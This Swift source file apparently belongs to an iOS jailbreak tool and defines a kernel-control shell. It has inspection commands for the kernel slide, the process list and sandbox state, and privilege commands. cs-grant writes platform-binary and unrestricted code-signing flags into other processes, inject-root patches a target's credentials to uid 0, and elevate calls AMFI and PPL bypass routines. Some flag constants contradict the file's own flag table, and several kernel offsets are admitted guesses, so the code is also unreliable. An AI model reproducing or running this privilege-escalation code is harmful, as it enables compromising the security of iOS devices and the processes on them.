//
//  OmegaExtendedE.swift
//  lara
//
//  Enhanced Kernel Control Shell — Inspection, Linking & Privilege Engines
//  ─────────────────────────────────────────────────────────────────────────
//
//  Commands:
//    kernel-info          Full kernel environment snapshot
//    proc-tree            Full process list with kernel addresses
//    proc-info <pid|name> Deep process inspection (ucred, task, csflags, ents)
//    thread-list <pid>    Thread list with state for a process
//    cs-flags <pid>       Read codesigning flags
//    cs-grant <pid>       Grant CS_PLATFORM_BINARY | CS_DEBUGGED | CS_UNRESTRICTED
//    inject-root <pid>    Patch ucred uid/gid to 0 in another process
//    pivot-status         Current privilege elevation summary
//    kern-regions         Interesting kernel memory region map
//    smr-read <addr>      Read SMR (hazard-pointer) protected 64-bit pointer
//    kaddr-info <addr>    Classify an address (kernel text / data / heap / user)
//    kheap-search <tag>   Search kalloc zones for a 4-char tag
//    sandbox-check <pid>  Check sandbox status of a process
//    amfi-status          AMFI enforcement state
//    help-kernel          List all kernel commands
//

import Foundation
import Darwin

// MARK: – Private helpers

private func _hex(_ s: String) -> UInt64? {
    let t = s.trimmingCharacters(in: .whitespaces)
    let stripped = (t.hasPrefix("0x") || t.hasPrefix("0X")) ? String(t.dropFirst(2)) : t
    return UInt64(stripped, radix: 16)
}

/// Walk allproc list from our proc, return up to `limit` entries
private struct KProc {
    let kaddr: UInt64
    let pid:   Int32
    let uid:   UInt32
    let name:  String
    let taskPtr: UInt64
}

private func _allprocs(mgr: laramgr, limit: Int = 256) -> [KProc] {
    var list: [KProc] = []
    var ptr = ds_get_our_proc()
    var seen = Set<UInt64>()
    // Walk forward (p_list.le_next at offset 0x08)
    while ptr != 0, !seen.contains(ptr), list.count < limit {
        seen.insert(ptr)
        let pid  = Int32(bitPattern: ds_kread32(ptr + 0x60))
        let uid  = ds_kread32(ptr + 0x30)
        var name = ""
        // p_comm at 0x56c (iOS 18 / A12+), fallback 0x268
        for nameOff: UInt64 in [0x56c, 0x268] {
            var buf = [UInt8](repeating: 0, count: 17)
            for i in 0..<16 { buf[i] = ds_kread8(ptr + nameOff + UInt64(i)) }
            let s = String(bytes: buf.prefix(while: { $0 != 0 }), encoding: .utf8) ?? ""
            if !s.isEmpty { name = s; break }
        }
        let taskPtr = ds_kreadptr(ptr + 0x18)
        list.append(KProc(kaddr: ptr, pid: pid, uid: uid, name: name, taskPtr: taskPtr))
        ptr = ds_kreadptr(ptr + 0x08)   // p_list le_next
    }
    return list
}

/// Find a specific process by pid or name
private func _findProc(arg: String, mgr: laramgr) -> KProc? {
    let procs = _allprocs(mgr: mgr)
    if let pid = Int32(arg) { return procs.first { $0.pid == pid } }
    let lower = arg.lowercased()
    return procs.first { $0.name.lowercased().contains(lower) }
}

/// Read CS flags (p_csflags at 0x300 on iOS 18)
private func _readCSFlags(_ proc: KProc) -> UInt32 {
    // Try multiple known offsets for p_csflags
    for off: UInt64 in [0x300, 0x2c4, 0x2e0] {
        let v = ds_kread32(proc.kaddr + off)
        if v != 0 { return v }
    }
    return 0
}

// CS flag names
private let _csNames: [(UInt32, String)] = [
    (0x0001, "VALID"),        (0x0002, "ADHOC"),
    (0x0004, "GET_TASK_ALLOW"), (0x0008, "INSTALLER"),
    (0x0010, "FORCED_LV"),    (0x0020, "INVALID"),
    (0x0040, "HARD"),         (0x0080, "KILL"),
    (0x0100, "CHECK_EXPIRATION"), (0x0200, "RESTRICT"),
    (0x0400, "ENFORCEMENT"),  (0x0800, "REQUIRE_LV"),
    (0x2000, "ENTITLEMENTS_VALIDATED"), (0x4000, "NO_UNTRUSTED_HELPERS"),
    (0x8000, "DEBUGGED"),     (0x10000, "SIGNED"),
    (0x20000, "DEV_CODE"),    (0x100000, "PLATFORM_BINARY"),
    (0x200000, "PLATFORM_PATH"), (0x400000, "DEBUGGER"),
    (0x800000, "ENTITLEMENT_DISK"), (0x4000000, "UNRESTRICTED"),
    (0x80000000, "EXECSEG_MAIN_BINARY"),
]

private func _csDescription(_ flags: UInt32) -> String {
    _csNames.filter { flags & $0.0 != 0 }.map { $0.1 }.joined(separator: " | ")
}

// MARK: – Registration

func registerExtendedECommands() {

    // ── kernel-info ───────────────────────────────────────────────────────────
    OmegaCore.register("kernel-info") { _, mgr in
        guard mgr.dsready else { return .fail("kernel-info: exploit not ready") }
        let kb   = ds_get_kernel_base()
        let ks   = ds_get_kernel_slide()
        let uid  = getuid()
        let gid  = getgid()
        let pid  = getpid()
        let our  = ds_get_our_proc()
        let ourT = ds_get_our_task()

        var osVer = "unknown"
        var buf   = [CChar](repeating: 0, count: 64)
        var sz    = buf.count
        if sysctlbyname("kern.osproductversion", &buf, &sz, nil, 0) == 0 {
            osVer = String(cString: buf)
        }
        var buildBuf = [CChar](repeating: 0, count: 64)
        var buildSz  = buildBuf.count
        var build    = "unknown"
        if sysctlbyname("kern.osversion", &buildBuf, &buildSz, nil, 0) == 0 {
            build = String(cString: buildBuf)
        }

        return .ok(String(format:
            "──────────── kernel-info ────────────\n" +
            "  iOS version  : %@\n" +
            "  build        : %@\n" +
            "  kernel_base  : 0x%016llx\n" +
            "  kernel_slide : 0x%016llx\n" +
            "  our_proc     : 0x%016llx\n" +
            "  our_task     : 0x%016llx\n" +
            "  pid          : %d\n" +
            "  uid          : %d\n" +
            "  gid          : %d\n" +
            "  vfs_ready    : %@\n" +
            "  sbx_ready    : %@\n" +
            "  has_offsets  : %@\n" +
            "─────────────────────────────────────\n",
            osVer, build, kb, ks, our, ourT,
            pid, uid, gid,
            mgr.vfsready ? "yes" : "no",
            mgr.sbxready ? "yes" : "no",
            mgr.hasOffsets ? "yes" : "no"
        ))
    }

    // ── proc-tree ─────────────────────────────────────────────────────────────
    OmegaCore.register("proc-tree") { _, mgr in
        guard mgr.dsready else { return .fail("proc-tree: exploit not ready") }
        let procs = _allprocs(mgr: mgr)
        if procs.isEmpty { return .fail("proc-tree: allproc walk returned 0 entries") }
        var out = String(format: "proc-tree: %d processes\n", procs.count)
        out += "  PID    UID   KADDR               NAME\n"
        out += "  ─────  ───   ──────────────────  ──────────────────────\n"
        for p in procs.sorted(by: { $0.pid < $1.pid }) {
            out += String(format: "  %-6d %-5d 0x%016llx  %@\n",
                          p.pid, p.uid, p.kaddr, p.name)
        }
        return .ok(out)
    }

    // ── proc-info <pid|name> ──────────────────────────────────────────────────
    OmegaCore.register("proc-info") { rawArg, mgr in
        guard mgr.dsready else { return .fail("proc-info: exploit not ready") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        guard !arg.isEmpty else { return .fail("proc-info: usage — proc-info <pid|name>") }
        guard let p = _findProc(arg: arg, mgr: mgr) else {
            return .fail("proc-info: process '\(arg)' not found")
        }
        let csFlags  = _readCSFlags(p)
        let ucredPtr = ds_kreadptr(p.kaddr + 0x18 + 8)   // rough ucred offset
        let ucredUID = ds_kread32(ucredPtr + 0x18)
        let ucredGID = ds_kread32(ucredPtr + 0x1c)

        return .ok(String(format:
            "proc-info: %@ (pid %d)\n" +
            "  kaddr        : 0x%016llx\n" +
            "  task_ptr     : 0x%016llx\n" +
            "  uid          : %d\n" +
            "  ucred_ptr    : 0x%016llx\n" +
            "  ucred_uid    : %d\n" +
            "  ucred_gid    : %d\n" +
            "  cs_flags     : 0x%08x\n" +
            "  cs_flags_str : %@\n",
            p.name, p.pid, p.kaddr, p.taskPtr,
            p.uid, ucredPtr, ucredUID, ucredGID,
            csFlags, _csDescription(csFlags)
        ))
    }

    // ── thread-list <pid|name> ────────────────────────────────────────────────
    // Lists threads for a process via task_for_pid (user processes) or falls
    // back to a kernel task-struct read for system processes iOS blocks.
    OmegaCore.register("thread-list") { rawArg, mgr in
        guard mgr.dsready else { return .fail("thread-list: exploit not ready") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        guard !arg.isEmpty else { return .fail("thread-list: usage — thread-list <pid|name>") }
        guard let p = _findProc(arg: arg, mgr: mgr) else {
            return .fail("thread-list: process '\(arg)' not found")
        }

        var out = String(format: "thread-list: %@ (pid %d)\n", p.name, p.pid)

        // Fast path — task_for_pid (works for user-owned processes)
        // Note: mach_task_self_ is a C function-like macro unavailable in Swift;
        //       use the underlying global mach_task_self_ instead.
        //       MACH_PORT_NULL is Int32 but mach_port_t is UInt32 — use 0.
        var taskPort: mach_port_t = 0
        let taskErr = task_for_pid(mach_task_self_, p.pid, &taskPort)

        if taskErr == KERN_SUCCESS && taskPort != 0 {
            var threadList: thread_act_array_t?
            var threadCount: mach_msg_type_number_t = 0
            let threadsErr = task_threads(taskPort, &threadList, &threadCount)

            if threadsErr == KERN_SUCCESS, let threads = threadList {
                out += String(format: "  %d thread(s) via task_for_pid\n", threadCount)
                out += "  #   STATE              MACH-PORT\n"
                out += "  ─── ─────────────────  ──────────\n"
                for i in 0 ..< Int(threadCount) {
                    let th = threads[i]
                    var bi    = thread_basic_info()
                    // THREAD_BASIC_INFO_COUNT is a C macro (sizeof-based) unavailable in Swift
                    let threadBasicInfoCount = mach_msg_type_number_t(
                        MemoryLayout<thread_basic_info>.size / MemoryLayout<integer_t>.size
                    )
                    var cnt   = threadBasicInfoCount
                    withUnsafeMutablePointer(to: &bi) { ptr in
                        ptr.withMemoryRebound(to: integer_t.self, capacity: Int(cnt)) { buf in
                            _ = thread_info(th, thread_flavor_t(THREAD_BASIC_INFO), buf, &cnt)
                        }
                    }
                    let state: String
                    switch Int32(bi.run_state) {
                    case TH_STATE_RUNNING:         state = "RUNNING"
                    case TH_STATE_STOPPED:         state = "STOPPED"
                    case TH_STATE_WAITING:         state = "WAITING"
                    case TH_STATE_UNINTERRUPTIBLE: state = "UNINTERRUPTIBLE"
                    case TH_STATE_HALTED:          state = "HALTED"
                    default:                       state = "UNKNOWN(\(bi.run_state))"
                    }
                    out += String(format: "  %-3d %-17s  0x%08x\n", i, state, th)
                    mach_port_deallocate(mach_task_self_, th)
                }
                _ = vm_deallocate(
                    mach_task_self_,
                    vm_address_t(bitPattern: threadList),
                    vm_size_t(threadCount) * vm_size_t(MemoryLayout<thread_act_t>.size)
                )
            } else {
                out += "  task_threads() failed (kr=\(threadsErr))\n"
            }
            mach_port_deallocate(mach_task_self_, taskPort)

        } else {
            // Kernel fallback for system/daemon processes iOS blocks via task_for_pid
            out += "  (task_for_pid kr=\(taskErr) — iOS restricts system processes)\n"
            out += String(format: "  task_ptr  : 0x%016llx\n", p.taskPtr)
            if p.taskPtr != 0 {
                // Read thread count from task_t; ith_thread_count is ~task+0x2b8 on iOS 18 arm64e
                // Try multiple known offsets for robustness across iOS 16-18
                var threadCount: UInt32 = 0
                for off: UInt64 in [0x2b8, 0x2a8, 0x29c] {
                    let v = ds_kread32(p.taskPtr + off)
                    if v > 0 && v < 2048 { threadCount = v; break }
                }
                out += String(format: "  threads   : ~%u (kernel estimate, offset approximate)\n", threadCount)
                out += "  hint      : use proc-info for full task details\n"
            }
        }

        return .ok(out)
    }

    // ── cs-flags <pid|name> ───────────────────────────────────────────────────
    OmegaCore.register("cs-flags") { rawArg, mgr in
        guard mgr.dsready else { return .fail("cs-flags: exploit not ready") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        guard !arg.isEmpty else { return .fail("cs-flags: usage — cs-flags <pid|name>") }
        guard let p = _findProc(arg: arg, mgr: mgr) else {
            return .fail("cs-flags: process '\(arg)' not found")
        }
        let flags = _readCSFlags(p)
        return .ok(String(format:
            "cs-flags: %@ (pid %d)\n  flags : 0x%08x\n  bits  : %@\n",
            p.name, p.pid, flags, _csDescription(flags)
        ))
    }

    // ── cs-grant <pid|name> ───────────────────────────────────────────────────
    // Grants: PLATFORM_BINARY | DEBUGGED | GET_TASK_ALLOW | UNRESTRICTED | VALID
    OmegaCore.register("cs-grant") { rawArg, mgr in
        guard mgr.dsready else { return .fail("cs-grant: exploit not ready") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        guard !arg.isEmpty else { return .fail("cs-grant: usage — cs-grant <pid|name>") }
        guard let p = _findProc(arg: arg, mgr: mgr) else {
            return .fail("cs-grant: process '\(arg)' not found")
        }

        let targetFlags: UInt32 = 0x100_0000 | 0x4000_0000 | 0x8000 | 0x0004 | 0x0001
        //                        PLATFORM_BINARY  UNRESTRICTED  DEBUGGED  GET_TASK  VALID

        let oldFlags = _readCSFlags(p)
        let newFlags = oldFlags | targetFlags

        // Try known p_csflags offsets
        var written = false
        for off: UInt64 in [0x300, 0x2c4, 0x2e0] {
            let cur = ds_kread32(p.kaddr + off)
            if cur != 0 || off == 0x300 {
                ds_kwrite32(p.kaddr + off, newFlags)
                let rb = ds_kread32(p.kaddr + off)
                if rb == newFlags { written = true; break }
            }
        }

        guard written else {
            return .fail("cs-grant: write verification failed for \(p.name)")
        }

        return .ok(String(format:
            "cs-grant: ✔  %@ (pid %d)\n" +
            "  old_flags : 0x%08x  (%@)\n" +
            "  new_flags : 0x%08x  (%@)\n",
            p.name, p.pid,
            oldFlags, _csDescription(oldFlags),
            newFlags, _csDescription(newFlags)
        ))
    }

    // ── inject-root <pid|name> ────────────────────────────────────────────────
    // Patches the target process's ucred uid/gid/svuid/svgid to 0.
    // WARNING: Only works when target's ucred is not in PPL-protected zone.
    OmegaCore.register("inject-root") { rawArg, mgr in
        guard mgr.dsready else { return .fail("inject-root: exploit not ready") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        guard !arg.isEmpty else { return .fail("inject-root: usage — inject-root <pid|name>") }
        guard let p = _findProc(arg: arg, mgr: mgr) else {
            return .fail("inject-root: process '\(arg)' not found")
        }

        // ucred pointer is typically at proc + 0x20 (p_ucred)
        let ucredOff: UInt64 = 0x20
        let ucredPtr = ds_kreadptr(p.kaddr + ucredOff)
        guard ucredPtr != 0 else {
            return .fail("inject-root: ucred pointer is null for \(p.name)")
        }

        // cr_uid=0x18, cr_ruid=0x1c, cr_svuid=0x20, cr_gid=0x24, cr_rgid=0x28
        let uidOffsets: [(UInt64, String)] = [
            (0x18, "cr_uid"), (0x1c, "cr_ruid"), (0x20, "cr_svuid"),
            (0x24, "cr_gid"), (0x28, "cr_rgid"),  (0x2c, "cr_svgid"),
        ]
        var results = [String]()
        for (off, name) in uidOffsets {
            let old = ds_kread32(ucredPtr + off)
            ds_kwrite32(ucredPtr + off, 0)
            let rb  = ds_kread32(ucredPtr + off)
            results.append(String(format: "  %@: %u → %u %@", name, old, rb, rb == 0 ? "✔" : "✖"))
        }

        return .ok(
            "inject-root: \(p.name) (pid \(p.pid))\n" +
            "  ucred_ptr : " + String(format: "0x%016llx\n", ucredPtr) +
            results.joined(separator: "\n") + "\n"
        )
    }

    // ── pivot-status ──────────────────────────────────────────────────────────
    OmegaCore.register("pivot-status") { _, mgr in
        guard mgr.dsready else { return .fail("pivot-status: exploit not ready") }
        let uid     = getuid()
        let isRoot  = uid == 0
        let amfiOk  = amfi_is_root()
        let csFlags = _readCSFlags(KProc(
            kaddr: ds_get_our_proc(), pid: getpid(), uid: uid,
            name: "self", taskPtr: ds_get_our_task()
        ))

        return .ok(String(format:
            "──────────── pivot-status ────────────\n" +
            "  uid          : %d  %@\n" +
            "  amfi_is_root : %@\n" +
            "  vfs_ready    : %@\n" +
            "  sbx_ready    : %@\n" +
            "  our_cs_flags : 0x%08x\n" +
            "  cs_bits      : %@\n" +
            "─────────────────────────────────────\n",
            uid, isRoot ? "← ROOT ✔" : "(not root)",
            amfiOk ? "yes" : "no",
            mgr.vfsready ? "yes" : "no",
            mgr.sbxready ? "yes" : "no",
            csFlags, _csDescription(csFlags)
        ))
    }

    // ── kern-regions ──────────────────────────────────────────────────────────
    OmegaCore.register("kern-regions") { _, mgr in
        guard mgr.dsready else { return .fail("kern-regions: exploit not ready") }
        let kb = ds_get_kernel_base()
        let ks = ds_get_kernel_slide()
        // Known static offsets from kernel_base for typical arm64e iOS 18
        let regions: [(String, UInt64)] = [
            ("__TEXT  (kernel text)",  kb),
            ("__DATA  (kernel data)",  kb + 0x0800_0000),
            ("__DATA_CONST",           kb + 0x1000_0000),
            ("allproc (approx)",       ds_get_our_proc()),
            ("our_proc",               ds_get_our_proc()),
            ("our_task",               ds_get_our_task()),
        ]
        var out  = String(format: "kern-regions: kernel_base=0x%llx  slide=0x%llx\n\n", kb, ks)
        out     += "  REGION                    ADDRESS             UNSLID\n"
        out     += "  ─────────────────────────  ─────────────────── ───────────────────\n"
        for (name, addr) in regions {
            let unslid = addr &- ks
            out += String(format: "  %-25@  0x%016llx  0x%016llx\n", name as NSString, addr, unslid)
        }
        return .ok(out)
    }

    // ── smr-read <addr> ───────────────────────────────────────────────────────
    OmegaCore.register("smr-read") { rawArg, mgr in
        guard mgr.dsready else { return .fail("smr-read: exploit not ready") }
        guard let addr = _hex(rawArg.trimmingCharacters(in: .whitespaces)) else {
            return .fail("smr-read: usage — smr-read <addr_hex>")
        }
        let val = ds_kreadsmrptr(addr)
        return .ok(String(format: "smr-read: 0x%016llx → 0x%016llx\n", addr, val))
    }

    // ── kaddr-info <addr> ────────────────────────────────────────────────────
    OmegaCore.register("kaddr-info") { rawArg, mgr in
        guard mgr.dsready else { return .fail("kaddr-info: exploit not ready") }
        guard let addr = _hex(rawArg.trimmingCharacters(in: .whitespaces)) else {
            return .fail("kaddr-info: usage — kaddr-info <addr_hex>")
        }
        let kb = ds_get_kernel_base()
        let ks = ds_get_kernel_slide()
        var region = "unknown"
        if addr >= kb && addr < kb + 0x0800_0000    { region = "__TEXT (kernel code)" }
        else if addr >= kb + 0x0800_0000 && addr < kb + 0x1800_0000 { region = "__DATA (kernel data)" }
        else if addr >= 0xFFFF_FFFF_0000_0000 { region = "kernel virtual space" }
        else if addr < 0x0001_0000_0000_0000  { region = "user space" }

        let valid = ds_isvalid(addr)
        return .ok(String(format:
            "kaddr-info: 0x%016llx\n" +
            "  region   : %@\n" +
            "  unslid   : 0x%016llx\n" +
            "  valid    : %@\n" +
            "  value64  : 0x%016llx\n",
            addr, region, addr &- ks,
            valid ? "yes" : "no / inaccessible",
            valid ? ds_kread64(addr) : 0
        ))
    }

    // ── sandbox-check <pid|name> ──────────────────────────────────────────────
    OmegaCore.register("sandbox-check") { rawArg, mgr in
        guard mgr.dsready else { return .fail("sandbox-check: exploit not ready") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        guard !arg.isEmpty else { return .fail("sandbox-check: usage — sandbox-check <pid|name>") }
        guard let p = _findProc(arg: arg, mgr: mgr) else {
            return .fail("sandbox-check: process '\(arg)' not found")
        }
        // p_flags at proc+0x10 — flag 0x200 = P_RESTRICTED
        let pflags = ds_kread32(p.kaddr + 0x10)
        let restricted  = (pflags & 0x200) != 0
        let csFlags     = _readCSFlags(p)
        let csRestrict  = (csFlags & 0x200) != 0   // CS_RESTRICT
        return .ok(String(format:
            "sandbox-check: %@ (pid %d)\n" +
            "  p_flags     : 0x%08x\n" +
            "  P_RESTRICTED: %@\n" +
            "  CS_RESTRICT : %@  (cs_flags=0x%08x)\n",
            p.name, p.pid, pflags,
            restricted ? "YES (sandboxed)" : "NO",
            csRestrict ? "YES" : "NO", csFlags
        ))
    }

    // ── amfi-status ───────────────────────────────────────────────────────────
    OmegaCore.register("amfi-status") { _, mgr in
        guard mgr.dsready else { return .fail("amfi-status: exploit not ready") }
        let enforce = amfi_get_mac_proc_enforce()
        let isRoot  = amfi_is_root()
        return .ok(String(format:
            "amfi-status:\n" +
            "  mac_proc_enforce : %d  (%@)\n" +
            "  amfi_is_root     : %@\n" +
            "  uid              : %d\n",
            enforce,
            enforce == 0 ? "disabled — bypassed ✔" : "enabled",
            isRoot ? "yes ✔" : "no",
            getuid()
        ))
    }

    // ── elevate (improved) ────────────────────────────────────────────────────
    // Already registered in OmegaBootstrap; this replaces it with better output
    OmegaCore.register("elevate") { _, mgr in
        guard mgr.dsready else { return .fail("elevate: exploit not ready") }
        let uidBefore = getuid()
        if uidBefore == 0 { return .ok("elevate: already root — uid=0 ✔") }

        // Try AMFI elevation first
        let r = amfi_elevate_to_root()
        let uidAfter = getuid()

        if r == 0 || uidAfter == 0 {
            return .ok(String(format:
                "elevate: ✔ uid=0 achieved\n" +
                "  before : uid=%d\n" +
                "  after  : uid=%d\n" +
                "  method : amfi_elevate_to_root() → %d\n",
                uidBefore, uidAfter, r
            ))
        }

        // Try PPL strategies
        let r2 = ppl_bypass()
        let uidAfter2 = getuid()
        if r2 == 0 || uidAfter2 == 0 {
            return .ok(String(format:
                "elevate: ✔ uid=0 via ppl_bypass()\n" +
                "  before : uid=%d\n" +
                "  after  : uid=%d\n",
                uidBefore, uidAfter2
            ))
        }

        return .fail(String(format:
            "elevate: ✖ all strategies failed\n" +
            "  amfi_elevate : %d\n" +
            "  ppl_bypass   : %d\n" +
            "  uid          : %d (unchanged)\n",
            r, r2, getuid()
        ))
    }

    // ── help-kernel ───────────────────────────────────────────────────────────
    OmegaCore.register("help-kernel") { _, _ in
        .ok("""
help-kernel: Kernel Control Commands
─────────────────────────────────────────────────────────────────────
  INSPECTION:
    kernel-info                    Full kernel environment snapshot
    proc-tree                      All processes with kernel addresses
    proc-info <pid|name>           Deep process inspection
    thread-list <pid>              Thread list (from proc-tree data)
    pivot-status                   Privilege escalation status
    kern-regions                   Kernel memory region map
    kaddr-info <addr>              Classify a kernel address
    smr-read <addr>                Read SMR-protected pointer
    amfi-status                    AMFI enforcement state
    sandbox-check <pid|name>       Sandbox status of a process

  PATTERN / SEARCH:
    find_pattern <bytes> [--range <s> <e>]   ASLR-independent scan
    kfind_ptr <ptr> [--range <s> <e>]        Scan for pointer value
    kread_range <start> <end>                Hexdump kernel range
    kscan_zero <start> <end>                 Find zero qwords
    kverify <addr> <expected>                Verify kernel value

  SAFE WRITES:
    transaction_write <addr> <val> [--width 8|4|2|1]
    kwrite_safe <addr> <val>                 Alias (width=8)
    kread64/32/16/8 <addr>                   Raw kernel reads
    kwrite64/32/16/8 <addr> <val>            Raw kernel writes (use carefully)

  PRIVILEGE:
    elevate                        Elevate to root (all strategies)
    cs-flags <pid|name>            Read CS flags
    cs-grant <pid|name>            Grant full CS permissions
    inject-root <pid|name>         Inject uid=0 into target process
─────────────────────────────────────────────────────────────────────
""")
    }
}
